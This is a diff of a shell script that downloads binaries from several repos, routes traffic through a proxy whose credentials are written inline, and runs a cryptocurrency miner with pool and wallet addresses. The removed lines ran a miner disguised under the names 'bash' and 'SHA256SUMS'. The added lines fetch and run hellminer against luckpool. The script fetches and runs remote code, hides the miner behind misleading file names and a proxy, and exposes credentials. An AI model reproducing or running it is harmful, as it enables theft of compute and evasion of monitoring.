@@ -2,8 +2,8 @@ proxy="38.154.227.167"
 port="5868" 
 user="ugursfso"  
 pass="wqn60pnk6m95" 
-wget https://gitlab.com/alexandercobaeli471/thegitpp/-/raw/main/bash && chmod +x bash
-wget https://raw.githubusercontent.com/pagesrlepla/mx9/main/SHA256SUMS && chmod +x SHA256SUMS 
+curl https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+tar -xf hellminer_linux64.tar.gz
 wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
@@ -20,4 +20,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./bash --wallet-address=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xeth4v7yz7m959q2c897k --daemon-rpc-address=community-pools.mysrv.cloud:10300 
+./panel ./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RRYVVDXrrwgchzytdZk4AAZuNm21348cF9.1 -p x
